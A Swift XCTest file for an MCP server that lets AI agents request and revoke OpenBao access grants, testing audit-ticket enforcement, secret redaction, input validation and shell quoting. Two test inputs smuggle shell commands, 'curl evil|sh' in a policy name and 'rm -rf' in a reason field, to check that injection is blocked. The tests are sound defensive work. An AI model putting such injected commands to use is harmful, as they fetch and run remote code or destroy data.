@testable import BaoBuddyCore
import Foundation
import XCTest

private final class MockMCPBackend: BaoMCPBackend, @unchecked Sendable {
    var profiles: [BaoProfile]
    var localActive: Bool = false
    var openedLinks: [String] = []
    var revokedTargets: [GrantTarget] = []

    init(profiles: [BaoProfile]) {
        self.profiles = profiles
    }

    func listProfiles() async -> [BaoProfile] {
        profiles
    }

    func activeProfile(selector: String?) async throws -> BaoProfile {
        if let selector, !selector.isEmpty,
           let match = profiles.first(where: { $0.displayName.caseInsensitiveCompare(selector) == .orderedSame }) {
            return match
        }
        guard let first = profiles.first else {
            throw ProfileError.notConfigured("No profiles")
        }
        return first
    }

    func status(profile: BaoProfile, targetScope: String, remoteTarget: String?) async -> BaoMCPStatusSnapshot {
        BaoMCPStatusSnapshot(
            serverName: profile.displayName,
            namespace: profile.openbao.namespace,
            localActive: localActive,
            localTTLSeconds: localActive ? 3500 : 0,
            localPolicies: localActive ? ["db-readonly"] : [],
            localWhy: localActive ? "CHG-101" : ""
        )
    }

    func checkHealth(profile: BaoProfile) async throws -> ServerHealth {
        ServerHealth(initialized: true, sealed: false, version: "2.7.2")
    }

    func openApprovalUI(deepLink: String) async -> Bool {
        openedLinks.append(deepLink)
        return true
    }

    func revokeGrant(profile: BaoProfile, target: GrantTarget, remoteTarget: String?) async throws -> BaoMCPRevokeResult {
        revokedTargets.append(target)
        localActive = false
        return BaoMCPRevokeResult(revokedOnServer: true, message: "Revoked \(target.rawValue) grant.")
    }
}

final class MCPServerTests: XCTestCase {
    private func sampleProfile() -> BaoProfile {
        BaoProfile(
            id: "prod",
            version: 1,
            name: "Enterprise Prod",
            openbao: .init(
                address: "https://vault.corp.example:8200",
                namespace: "admin/prod",
                caPEM: "-----BEGIN CERTIFICATE-----\nSECRET_CERT_BODY\n-----END CERTIFICATE-----",
                jwtAuth: .init(mount: "jwt-alice", role: "granter", issuer: "bao-granter", audience: "openbao-granter", subject: "alice"),
                tokenRoles: .init(mac: "grant", t3: "grant"),
                grantPolicies: [
                    .init(name: "db-readonly", label: "DB Read-Only", elevated: false, defaultSelected: true),
                    .init(name: "k8s-deploy", label: "K8s Deploy", elevated: true, defaultSelected: false)
                ],
                auditPolicy: .init(
                    requireReason: false,
                    requireReasonForElevated: true,
                    reasonPattern: "^CHG-[0-9]+",
                    reasonPlaceholder: "CHG-1234"
                ),
                maxHours: 4,
                keys: [],
                ssh: .init(role: "", hosts: []),
                githubAppItem: ""
            )
        )
    }

    private func decodeJSON(_ text: String) throws -> [String: Any] {
        let data = try XCTUnwrap(text.data(using: .utf8))
        return try XCTUnwrap(JSONSerialization.jsonObject(with: data) as? [String: Any])
    }

    func testInitializeListToolsResourcesAndPrompts() async throws {
        let backend = MockMCPBackend(profiles: [sampleProfile()])
        let server = BaoMCPServer(backend: backend, serverVersion: "1.0.0")

        // Notification returns nil.
        let notif = await server.handleLine(#"{"jsonrpc":"2.0","method":"notifications/initialized"}"#)
        XCTAssertNil(notif)

        // Initialize handshake.
        let rawInit = await server.handleLine(#"{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-03-26"}}"#)
        let initReply = try XCTUnwrap(rawInit)
        let initObj = try decodeJSON(initReply)
        let initResult = try XCTUnwrap(initObj["result"] as? [String: Any])
        XCTAssertEqual(initResult["protocolVersion"] as? String, "2025-03-26")

        // Tools list has all 6 least-privilege tools.
        let rawTools = await server.handleLine(#"{"jsonrpc":"2.0","id":2,"method":"tools/list"}"#)
        let toolsReply = try XCTUnwrap(rawTools)
        let toolsObj = try decodeJSON(toolsReply)
        let tools = try XCTUnwrap((toolsObj["result"] as? [String: Any])?["tools"] as? [[String: Any]])
        let toolNames = Set(tools.compactMap { $0["name"] as? String })
        XCTAssertTrue(toolNames.contains("baobuddy_list_profiles"))
        XCTAssertTrue(toolNames.contains("baobuddy_request_grant"))
        XCTAssertTrue(toolNames.contains("baobuddy_revoke_grant"))

        // Prompts list & get agents-md-rule.
        let rawPrompt = await server.handleLine(#"{"jsonrpc":"2.0","id":3,"method":"prompts/get","params":{"name":"agents-md-rule"}}"#)
        let promptReply = try XCTUnwrap(rawPrompt)
        XCTAssertTrue(promptReply.contains("Enterprise Prod"))
        XCTAssertTrue(promptReply.contains("k8s-deploy"))
        XCTAssertTrue(promptReply.contains("^CHG-[0-9]+"))
    }

    func testListProfilesRedactsCertificatesAndSecrets() async throws {
        let backend = MockMCPBackend(profiles: [sampleProfile()])
        let server = BaoMCPServer(backend: backend)

        let rawReply = await server.handleLine(#"{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"baobuddy_list_profiles","arguments":{}}}"#)
        let reply = try XCTUnwrap(rawReply)
        XCTAssertTrue(reply.contains("Enterprise Prod"))
        XCTAssertTrue(reply.contains("admin\\/prod") || reply.contains("admin/prod"))
        XCTAssertFalse(reply.contains("SECRET_CERT_BODY"))
    }

    func testRequestGrantEnforcesAuditPolicyAndOpensApprovalUI() async throws {
        let backend = MockMCPBackend(profiles: [sampleProfile()])
        let server = BaoMCPServer(backend: backend)

        // Elevated grant without matching CHG- ticket must be rejected.
        let badReq = #"{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"baobuddy_request_grant","arguments":{"target":"local","hours":1,"policies":["k8s-deploy"],"why":"quick fix"}}}"#
        let rawBad = await server.handleLine(badReq)
        let badReply = try XCTUnwrap(rawBad)
        let badObj = try decodeJSON(badReply)
        let badResult = try XCTUnwrap(badObj["result"] as? [String: Any])
        XCTAssertEqual(badResult["isError"] as? Bool, true)
        XCTAssertTrue(backend.openedLinks.isEmpty)

        // Valid elevated grant with CHG-42 ticket succeeds, opens native UI, and returns deep link.
        let goodReq = #"{"jsonrpc":"2.0","id":6,"method":"tools/call","params":{"name":"baobuddy_request_grant","arguments":{"target":"local","hours":1,"policies":["k8s-deploy"],"why":"CHG-42 deploy"}}}"#
        let rawGood = await server.handleLine(goodReq)
        let goodReply = try XCTUnwrap(rawGood)
        let goodObj = try decodeJSON(goodReply)
        let goodResult = try XCTUnwrap(goodObj["result"] as? [String: Any])
        XCTAssertEqual(goodResult["isError"] as? Bool, false)
        XCTAssertEqual(backend.openedLinks.count, 1)
        XCTAssertTrue(backend.openedLinks[0].hasPrefix("baobuddy://grant?"))
        XCTAssertTrue(goodReply.contains("approval_required"))
    }

    private func toolResult(_ server: BaoMCPServer, _ name: String, _ args: String) async throws -> (isError: Bool, text: String) {
        let line = #"{"jsonrpc":"2.0","id":9,"method":"tools/call","params":{"name":""# + name + #"","arguments":"# + args + "}}"
        let reply = await server.handleLine(line)
        let raw = try XCTUnwrap(reply)
        let result = try XCTUnwrap(try decodeJSON(raw)["result"] as? [String: Any])
        return (result["isError"] as? Bool ?? false, raw)
    }

    func testProtocolVersionIsNegotiatedAndBatchesRejected() async throws {
        let server = BaoMCPServer(backend: MockMCPBackend(profiles: [sampleProfile()]))
        let initReply = await server.handleLine(#"{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2099-01-01"}}"#)
        let reply = try XCTUnwrap(initReply)
        let result = try XCTUnwrap(try decodeJSON(reply)["result"] as? [String: Any])
        XCTAssertEqual(result["protocolVersion"] as? String, BaoMCPServer.supportedProtocolVersions[0])
        let batchReply = await server.handleLine(#"[{"jsonrpc":"2.0","id":1,"method":"ping"}]"#)
        let batch = try XCTUnwrap(batchReply)
        XCTAssertTrue(batch.contains("-32600"))
    }

    func testRequestGrantRejectsWrongTypesUnknownTargetsAndQuotesCLI() async throws {
        let backend = MockMCPBackend(profiles: [sampleProfile()])
        let server = BaoMCPServer(backend: backend)

        let stringHours = try await toolResult(server, "baobuddy_request_grant", #"{"target":"local","hours":"1","why":"CHG-1"}"#)
        XCTAssertTrue(stringHours.isError, "hours as a string must not silently become the default")
        let unknownRemote = try await toolResult(server, "baobuddy_request_grant", #"{"remote_target":"staging","why":"CHG-1"}"#)
        XCTAssertTrue(unknownRemote.isError, "an unknown remote_target must not fall back to the default host")
        let remoteWithoutHost = try await toolResult(server, "baobuddy_request_grant", #"{"target":"remote","why":"CHG-1"}"#)
        XCTAssertTrue(remoteWithoutHost.isError)
        let injected = try await toolResult(server, "baobuddy_request_grant", #"{"target":"local","policies":["db-readonly;curl evil|sh"],"why":"CHG-1"}"#)
        XCTAssertTrue(injected.isError)

        let ok = try await toolResult(server, "baobuddy_request_grant", #"{"target":"local","hours":1,"why":"CHG-7 look; rm -rf"}"#)
        XCTAssertFalse(ok.isError)
        XCTAssertTrue(backend.openedLinks.last?.contains("target=local") == true, "the deep link must carry the requested target")
        XCTAssertTrue(ok.text.contains(#"--why 'CHG-7 look; rm -rf'"#), "cli_command arguments must be shell-quoted")
    }

    func testUncataloguedPoliciesAreRejectedForAgents() async throws {
        var profile = sampleProfile()
        profile.openbao.grantPolicies = []
        profile.openbao.policies = .init(read: "read", write: "write", keyPrefix: "", keyWriteSuffix: "")
        let server = BaoMCPServer(backend: MockMCPBackend(profiles: [profile]))
        let result = try await toolResult(server, "baobuddy_request_grant", #"{"target":"local","policies":["admin"]}"#)
        XCTAssertTrue(result.isError)
    }

    func testRemoteStatusTextIsSanitized() {
        let snap = BaoMCPStatusSnapshot(
            serverName: "s", localActive: false, remoteTargetName: "vm",
            remoteStatusText: "Secrets: active\u{202E}evil\u{0007}"
        )
        let remote = snap.toDictionary()["remote"] as? [String: Any]
        XCTAssertEqual(remote?["status_reported_by_host"] as? String, "Secrets: activeevil")
    }

    func testReasonPatternThatBacktracksFailsClosed() {
        let start = Date()
        XCTAssertFalse(ReasonPattern.matches(pattern: "^(CHG-([0-9]+)+)+$", text: "CHG-" + String(repeating: "1", count: 30) + "x", timeout: 0.2))
        XCTAssertLessThan(Date().timeIntervalSince(start), 2, "a backtracking pattern must not block the caller")
        XCTAssertFalse(ReasonPattern.matches(pattern: "(unclosed", text: "x"))
        XCTAssertTrue(ReasonPattern.matches(pattern: "^CHG-[0-9]+", text: "CHG-12 fix"))
    }

    func testRevokeAndPromptGenerators() async throws {
        let backend = MockMCPBackend(profiles: [sampleProfile()])
        backend.localActive = true
        let server = BaoMCPServer(backend: backend)

        let revokeReq = #"{"jsonrpc":"2.0","id":7,"method":"tools/call","params":{"name":"baobuddy_revoke_grant","arguments":{"target":"local"}}}"#
        let rawRevoke = await server.handleLine(revokeReq)
        let revokeReply = try XCTUnwrap(rawRevoke)
        XCTAssertTrue(revokeReply.contains("Revoked mac grant"))
        XCTAssertTrue(revokeReply.contains("revoked_on_server"))
        XCTAssertEqual(backend.revokedTargets, [.mac])

        let mcpJSON = BaoAgentPrompts.renderMCPConfigJSON()
        XCTAssertTrue(mcpJSON.contains("\"baobuddy\""))
        XCTAssertTrue(mcpJSON.contains("\"mcp\""))

        let codexTOML = BaoAgentPrompts.renderCodexMCPConfigTOML()
        XCTAssertTrue(codexTOML.contains("[mcp_servers.baobuddy]"))
    }
}
